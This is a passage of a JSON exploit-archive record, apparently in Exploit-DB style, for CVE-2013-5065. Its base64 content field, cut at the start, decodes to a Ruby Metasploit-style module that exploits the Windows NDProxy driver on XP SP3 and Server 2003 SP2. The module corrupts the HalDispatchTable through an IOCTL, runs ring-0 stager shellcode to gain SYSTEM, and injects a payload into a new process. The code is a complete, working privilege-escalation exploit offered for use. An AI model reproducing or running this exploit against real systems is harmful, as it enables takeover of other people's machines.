Gd1biBzdHVmZi4uLiIpDQogICAgYWRkX3JhaWxndW5fZnVuY3Rpb25zDQoNCiAgICBpZiBzeXNpbmZvWyJBcmNoaXRlY3R1cmUiXSA9fiAvd293NjQvaSBvciBzeXNpbmZvWyJBcmNoaXRlY3R1cmUiXSA9fiAveDY0Lw0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6RGV0ZWN0ZWQNCiAgICBlbmQNCg0KICAgIGhhbmRsZSA9IG9wZW5fZGV2aWNlKCJcXFxcLlxcTkRQcm94eSIpDQogICAgaWYgaGFuZGxlLm5pbD8NCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlNhZmUNCiAgICBlbmQNCiAgICBzZXNzaW9uLnJhaWxndW4ua2VybmVsMzIuQ2xvc2VIYW5kbGUoaGFuZGxlKQ0KDQogICAgb3MgPSBzeXNpbmZvWyJPUyJdDQogICAgY2FzZSBvcw0KICAgIHdoZW4gL3dpbmRvd3MgeHAuKnNlcnZpY2UgcGFjayAzL2kNCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkFwcGVhcnMNCiAgICB3aGVuIC9bMjAwM3wubmV0IHNlcnZlcl0uKnNlcnZpY2UgcGFjayAyL2kNCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkFwcGVhcnMNCiAgICB3aGVuIC93aW5kb3dzIHhwL2kNCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkRldGVjdGVkDQogICAgd2hlbiAvWzIwMDN8Lm5ldCBzZXJ2ZXJdL2kNCiAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OkRldGVjdGVkDQogICAgZWxzZQ0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KICAgIGVuZA0KDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQoNCiAgICB2cHJpbnRfc3RhdHVzKCJBZGRpbmcgdGhlIHJhaWxndW4gc3R1ZmYuLi4iKQ0KICAgIGFkZF9yYWlsZ3VuX2Z1bmN0aW9ucw0KDQogICAgaWYgc3lzaW5mb1siQXJjaGl0ZWN0dXJlIl0gPX4gL3dvdzY0L2kNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb1RhcmdldCwgIlJ1bm5pbmcgYWdhaW5zdCBXT1c2NCBpcyBub3Qgc3VwcG9ydGVkIikNCiAgICBlbHNpZiBzeXNpbmZvWyJBcmNoaXRlY3R1cmUiXSA9fiAveDY0Lw0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vVGFyZ2V0LCAiUnVubmluZyBhZ2FpbnN0IDY0LWJpdCBzeXN0ZW1zIGlzIG5vdCBzdXBwb3J0ZWQiKQ0KICAgIGVuZA0KDQogICAgbXlfdGFyZ2V0ID0gbmlsDQogICAgaWYgdGFyZ2V0Lm5hbWUgPX4gL0F1dG9tYXRpYy8NCiAgICAgIHByaW50X3N0YXR1cygiRGV0ZWN0aW5nIHRoZSB0YXJnZXQgc3lzdGVtLi4uIikNCiAgICAgIG9zID0gc3lzaW5mb1siT1MiXQ0KICAgICAgaWYgb3MgPX4gL3dpbmRvd3MgeHAuKnNlcnZpY2UgcGFjayAzL2kNCiAgICAgICAgbXlfdGFyZ2V0ID0gdGFyZ2V0c1sxXQ0KICAgICAgICBwcmludF9zdGF0dXMoIlJ1bm5pbmcgYWdhaW5zdCAje215X3RhcmdldC5uYW1lfSIpDQogICAgICBlbHNpZiAoKG9zID1+IC8yMDAzLykgYW5kIChvcyA9fiAvc2VydmljZSBwYWNrIDIvaSkpDQogICAgICAgIG15X3RhcmdldCA9IHRhcmdldHNbMl0NCiAgICAgICAgcHJpbnRfc3RhdHVzKCJSdW5uaW5nIGFnYWluc3QgI3tteV90YXJnZXQubmFtZX0iKQ0KICAgICAgZWxzaWYgKChvcyA9fiAvXC5uZXQgc2VydmVyL2kpIGFuZCAob3MgPX4gL3NlcnZpY2UgcGFjayAyL2kpKQ0KICAgICAgICBteV90YXJnZXQgPSB0YXJnZXRzWzJdDQogICAgICAgIHByaW50X3N0YXR1cygiUnVubmluZyBhZ2FpbnN0ICN7bXlfdGFyZ2V0Lm5hbWV9IikNCiAgICAgIGVuZA0KICAgIGVsc2UNCiAgICAgIG15X3RhcmdldCA9IHRhcmdldA0KICAgIGVuZA0KDQogICAgaWYgbXlfdGFyZ2V0Lm5pbD8NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb1RhcmdldCwgIlJlbW90ZSBzeXN0ZW0gbm90IGRldGVjdGVkIGFzIHRhcmdldCwgc2VsZWN0IHRoZSB0YXJnZXQgbWFudWFsbHkiKQ0KICAgIGVuZA0KDQogICAgcHJpbnRfc3RhdHVzKCJDaGVja2luZyBkZXZpY2UuLi4iKQ0KICAgIGhhbmRsZSA9IG9wZW5fZGV2aWNlKCJcXFxcLlxcTkRQcm94eSIpDQogICAgaWYgaGFuZGxlLm5pbD8NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb1RhcmdldCwgIlxcXFwuXFxORFByb3h5IGRldmljZSBub3QgZm91bmQiKQ0KICAgIGVsc2UNCiAgICAgIHByaW50X2dvb2QoIlxcXFwuXFxORFByb3h5IGZvdW5kISIpDQogICAgZW5kDQoNCiAgICBwcmludF9zdGF0dXMoIkRpc2Nsb3NpbmcgdGhlIEhhbERpc3BhdGNoVGFibGUgYW5kIGhhbCFIYWxpUXVlcnlTeXN0ZW1JbmZvIGFkZHJlc3Nlcy4uLiIpDQogICAgQGFkZHJlc3NlcyA9IGRpc2Nsb3NlX2FkZHJlc3NlcyhteV90YXJnZXQpDQogICAgaWYgQGFkZHJlc3Nlcy5uaWw/DQogICAgICBzZXNzaW9uLnJhaWxndW4ua2VybmVsMzIuQ2xvc2VIYW5kbGUoaGFuZGxlKQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVua25vd24sICJGaWxlZCB0byBkaXNjbG9zZSBuZWNlc3NhcnkgYWRkcmVzc2VzIGZvciBleHBsb2l0YXRpb24uIEFib3J0aW5nLiIpDQogICAgZWxzZQ0KICAgICAgcHJpbnRfZ29vZCgiQWRkcmVzc2VzIHN1Y2Nlc3NmdWxseSBkaXNjbG9zZWQuIikNCiAgICBlbmQNCg0KDQogICAgcHJpbnRfc3RhdHVzKCJTdG9yaW5nIHRoZSBrZXJuZWwgc3RhZ2VyIG9uIG1lbW9yeS4uLiIpDQogICAgdGhpc19wcm9jID0gc2Vzc2lvbi5zeXMucHJvY2Vzcy5vcGVuDQogICAga2VybmVsX3NoZWxsID0gcmluZzBfc2hlbGxjb2RlKG15X3RhcmdldCkNCiAgICBrZXJuZWxfc2hlbGxfYWRkcmVzcyA9IDB4MTAwMA0KICAgIHJlc3VsdCA9IGZpbGxfbWVtb3J5KHRoaXNfcHJvYywga2VybmVsX3NoZWxsX2FkZHJlc3MsIGtlcm5lbF9zaGVsbC5sZW5ndGgsIGtlcm5lbF9zaGVsbCkNCiAgICBpZiByZXN1bHQubmlsPw0KICAgICAgc2Vzc2lvbi5yYWlsZ3VuLmtlcm5lbDMyLkNsb3NlSGFuZGxlKGhhbmRsZSkNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAiRXJyb3Igd2hpbGUgc3RvcmluZyB0aGUga2VybmVsIHN0YWdlciBzaGVsbGNvZGUgb24gbWVtb3J5IikNCiAgICBlbHNlDQogICAgICBwcmludF9nb29kKCJLZXJuZWwgc3RhZ2VyIHN1Y2Nlc3NmdWxseSBzdG9yZWQgYXQgMHgje2tlcm5lbF9zaGVsbF9hZGRyZXNzLnRvX3MoMTYpfSIpDQogICAgZW5kDQoNCiAgICBwcmludF9zdGF0dXMoIlN0b3JpbmcgdGhlIHRyYW1wb2xpbmUgdG8gdGhlIGtlcm5lbCBzdGFnZXIgb24gbWVtb3J5Li4uIikNCiAgICB0cmFtcG9saW5lID0gIlx4OTAiICogMHgzOCAgICAgICAjIG5vcHMNCiAgICB0cmFtcG9saW5lIDw8ICJceDY4IiAgICAgICAgICAgICAjIHB1c2ggb3Bjb2RlDQogICAgdHJhbXBvbGluZSA8PCBbMHgxMDAwXS5wYWNrKCJWIikgIyBhZGRyZXNzIHRvIHB1c2gNCiAgICB0cmFtcG9saW5lIDw8ICJceGMzIiAgICAgICAgICAgICAjIHJldA0KICAgIHRyYW1wb2xpbmVfYWRkciA9IDB4MQ0KICAgIHJlc3VsdCA9IGZpbGxfbWVtb3J5KHRoaXNfcHJvYywgdHJhbXBvbGluZV9hZGRyLCB0cmFtcG9saW5lLmxlbmd0aCwgdHJhbXBvbGluZSkNCiAgICBpZiByZXN1bHQubmlsPw0KICAgICAgc2Vzc2lvbi5yYWlsZ3VuLmtlcm5lbDMyLkNsb3NlSGFuZGxlKGhhbmRsZSkNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAiRXJyb3Igd2hpbGUgc3RvcmluZyB0cmFtcG9saW5lIG9uIG1lbW9yeSIpDQogICAgZWxzZQ0KICAgICAgcHJpbnRfZ29vZCgiVHJhbXBvbGluZSBzdWNjZXNzZnVsbHkgc3RvcmVkIGF0IDB4I3t0cmFtcG9saW5lX2FkZHIudG9fcygxNil9IikNCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygiU3RvcmluZyB0aGUgSU8gQ29udHJvbCBidWZmZXIgb24gbWVtb3J5Li4uIikNCiAgICBidWZmZXIgPSAiXHgwMCIgKiAxMDI0DQogICAgYnVmZmVyWzIwLCA0XSA9IFsweDcwMzAxMjVdLnBhY2soIlYiKSAjIEluIG9yZGVyIHRvIHRyaWdnZXIgdGhlIHZ1bG5lcmFibGUgY2FsbA0KICAgIGJ1ZmZlclsyOCwgNF0gPSBbMHgzNF0ucGFjaygiViIpICAgICAgIyBJbiBvcmRlciB0byB0cmlnZ2VyIHRoZSB2dWxuZXJhYmxlIGNhbGwNCiAgICBidWZmZXJfYWRkciA9IDB4MGQwZDAwMDANCiAgICByZXN1bHQgPSBmaWxsX21lbW9yeSh0aGlzX3Byb2MsIGJ1ZmZlcl9hZGRyLCBidWZmZXIubGVuZ3RoLCBidWZmZXIpDQogICAgaWYgcmVzdWx0Lm5pbD8NCiAgICAgIHNlc3Npb24ucmFpbGd1bi5rZXJuZWwzMi5DbG9zZUhhbmRsZShoYW5kbGUpDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgIkVycm9yIHdoaWxlIHN0b3JpbmcgdGhlIElPIENvbnRyb2wgYnVmZmVyIG9uIG1lbW9yeSIpDQogICAgZWxzZQ0KICAgICAgcHJpbnRfZ29vZCgiSU8gQ29udHJvbCBidWZmZXIgc3VjY2Vzc2Z1bGx5IHN0b3JlZCBhdCAweCN7YnVmZmVyX2FkZHIudG9fcygxNil9IikNCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygiVHJpZ2dlcmluZyB0aGUgdnVsbmVyYWJpbGl0eSwgY29ycnVwdGluZyB0aGUgSGFsRGlzcGF0Y2hUYWJsZS4uLiIpDQogICAgbWFnaWNfaW9jdGwgPSAweDhmZmYyM2M4DQogICAgIyBWYWx1ZXMgdGFrZW4gZnJvbSB0aGUgZXhwbG9pdCBpbiB0aGUgd2lsZCwgc2VlIHJlZmVyZW5jZXMNCiAgICBpb2N0bCA9IHNlc3Npb24ucmFpbGd1bi5udGRsbC5OdERldmljZUlvQ29udHJvbEZpbGUoaGFuZGxlLCAwLCAwLCAwLCA0LCBtYWdpY19pb2N0bCwgYnVmZmVyX2FkZHIsIGJ1ZmZlci5sZW5ndGgsIGJ1ZmZlcl9hZGRyLCAweDgwKQ0KDQogICAgc2Vzc2lvbi5yYWlsZ3VuLmtlcm5lbDMyLkNsb3NlSGFuZGxlKGhhbmRsZSkNCg0KICAgIHByaW50X3N0YXR1cygiRXhlY3V0aW5nIHRoZSBLZXJuZWwgU3RhZ2VyIHRocm93IE50UXVlcnlJbnRlcnZhbFByb2ZpbGUoKS4uLiIpDQogICAgcmVzdWx0ID0gc2Vzc2lvbi5yYWlsZ3VuLm50ZGxsLk50UXVlcnlJbnRlcnZhbFByb2ZpbGUoMTMzNywgNCkNCg0KICAgIHByaW50X3N0YXR1cygiQ2hlY2tpbmcgcHJpdmlsZWdlcyBhZnRlciBleHBsb2l0YXRpb24uLi4iKQ0KDQogICAgdW5sZXNzIGlzX3N5c3RlbT8NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAiVGhlIGV4cGxvaXRhdGlvbiB3YXNuJ3Qgc3VjY2Vzc2Z1bCIpDQogICAgZW5kDQoNCiAgICBwID0gcGF5bG9hZC5lbmNvZGVkDQogICAgcHJpbnRfZ29vZCgiRXhwbG9pdGF0aW9uIHN1Y2Nlc3NmdWwhIENyZWF0aW5nIGEgbmV3IHByb2Nlc3MgYW5kIGxhdW5jaGluZyBwYXlsb2FkLi4uIikNCiAgICBuZXdfcGlkID0gY3JlYXRlX3Byb2MNCg0KICAgIGlmIG5ld19waWQubmlsPw0KICAgICAgcHJpbnRfd2FybmluZygiVW5hYmxlIHRvIGNyZWF0ZSBhIG5ldyBwcm9jZXNzLCBtYXliZSB5b3UncmUgaW50byBhIHNhbmRib3guIElmIHRoZSBjdXJyZW50IHByb2Nlc3MgaGFzIGJlZW4gZWxldmF0ZWQgdHJ5IHRvIG1pZ3JhdGUgYmVmb3JlIGV4ZWN1dGluZyBhIG5ldyBwcm9jZXNzLi4uIikNCiAgICAgIHJldHVybg0KICAgIGVuZA0KDQogICAgcHJpbnRfc3RhdHVzKCJJbmplY3RpbmcgI3twLmxlbmd0aC50b19zfSBieXRlcyBpbnRvICN7bmV3X3BpZH0gbWVtb3J5IGFuZCBleGVjdXRpbmcgaXQuLi4iKQ0KICAgIGlmIGV4ZWN1dGVfc2hlbGxjb2RlKHAsIG5pbCwgbmV3X3BpZCkNCiAgICAgIHByaW50X2dvb2QoIkVuam95IikNCiAgICBlbHNlDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgIkVycm9yIHdoaWxlIGV4ZWN1dGluZyB0aGUgcGF5bG9hZCIpDQogICAgZW5kDQoNCg0KICBlbmQNCg0KZW5k", 
    "filename": "platforms/windows/local/30392.rb", 
    "id": "30392", 
    "cves": [
        "CVE-2013-5065"
    ]
}